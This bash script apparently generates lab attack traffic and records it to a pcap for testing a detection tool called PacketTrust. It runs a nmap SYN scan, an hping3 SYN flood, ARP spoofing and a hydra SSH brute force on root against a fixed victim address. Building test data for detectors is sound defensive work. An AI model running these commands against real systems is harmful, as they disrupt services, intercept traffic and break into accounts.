#!/usr/bin/env bash
# gen_traffic.sh – Generate sample attack traffic for PacketTrust testing
# Run these commands in a lab environment (attacker -> victim).
# Requires: nmap, hping3, arpspoof (dsniff), hydra, tcpdump
#
# IMPORTANT: Lab/authorised use only!

set -euo pipefail

VICTIM="192.168.1.100"
ATTACKER="192.168.1.200"
IFACE="eth0"
OUTFILE="samples/lab_capture.pcap"

echo "=== Starting packet capture in background ==="
sudo tcpdump -i "$IFACE" -w "$OUTFILE" &
TCPDUMP_PID=$!
sleep 2

echo ""
echo "=== 1. Port Scan (nmap SYN scan) ==="
echo "Command: nmap -sS -p 1-1000 $VICTIM"
nmap -sS -p 1-1000 "$VICTIM" || true
sleep 2

echo ""
echo "=== 2. SYN Flood (hping3) ==="
echo "Command: hping3 -S --flood -p 80 $VICTIM"
timeout 5 hping3 -S --flood -p 80 "$VICTIM" || true
sleep 2

echo ""
echo "=== 3. ARP Spoofing (arpspoof) ==="
echo "Command: arpspoof -i $IFACE -t $VICTIM -r $ATTACKER"
timeout 5 sudo arpspoof -i "$IFACE" -t "$VICTIM" -r "$ATTACKER" 2>/dev/null || true
sleep 2

echo ""
echo "=== 4. SSH Brute Force (hydra) ==="
echo "Command: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$VICTIM"
timeout 10 hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 ssh://"$VICTIM" 2>/dev/null || true
sleep 2

echo ""
echo "=== Stopping capture ==="
sudo kill "$TCPDUMP_PID" 2>/dev/null || true
wait "$TCPDUMP_PID" 2>/dev/null || true

echo ""
echo "Done! Capture saved to $OUTFILE"
echo "Packet count: $(tcpdump -r "$OUTFILE" 2>/dev/null | wc -l)"
